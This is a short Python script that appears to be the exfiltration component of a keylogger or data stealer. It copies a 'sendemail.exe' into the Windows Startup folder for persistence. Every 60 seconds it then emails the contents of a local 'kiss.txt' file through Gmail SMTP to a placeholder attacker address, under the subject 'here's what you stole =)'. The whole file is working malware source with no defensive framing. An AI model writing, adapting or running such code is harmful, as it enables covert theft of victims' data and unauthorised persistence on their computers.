import smtplib
import os
from email.encoders import encode_base64
from email.header import Header
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.utils import formatdate
import time as t
import shutil

listapp=os.listdir("C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp")

if "sendemail.exe" not in listapp:
    src_path = r"./sendemail.exe"
    dst_path = r"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
    shutil.copy(src_path, dst_path)

r="./kiss.txt"

while True:
    t.sleep(60)
    msg = MIMEMultipart()

    msg['To'] = 'your gmail'
    msg['From'] = 'your gmail'
    msg['Subject'] = Header(s='here\'s what you stole =)', charset='utf-8')
    body = MIMEText('check it out.', _charset='utf-8')
    msg.attach(body)

    f = './kiss.txt'
    part = MIMEBase('application', "octet-stream")
    part.set_payload(open(f, "rb").read())
    encode_base64(part)
    part.add_header('Content-Disposition', 'attachment; filename="%s"' % os.path.basename(f))
    msg.attach(part)


    server = smtplib.SMTP('smtp.gmail.com', 587)

    server.starttls()

    server.login('your gmail', 'your app password')
    server.send_message(msg)
    server.quit()
    print("mail sent")
